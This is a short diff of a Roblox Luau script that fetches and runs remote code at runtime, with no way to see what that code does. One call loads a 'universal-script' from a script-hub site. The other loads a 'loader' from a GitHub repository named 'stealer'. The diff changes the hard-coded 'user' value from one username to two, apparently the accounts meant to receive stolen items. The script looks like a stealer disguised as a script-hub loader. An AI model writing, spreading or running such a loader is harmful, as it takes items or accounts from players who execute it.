@@ -1,4 +1,4 @@
 loadstring(game:HttpGet("https://static.rayz-hub.lol/universal-script.luau", true))()
-user = "Temphorious"
+user = {"temphorious", "noob2progrow888"}
 id = "horizon$scripts-f9a26a7d-508f-4013-9519-673ac4b1a26b"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/loader", true))()
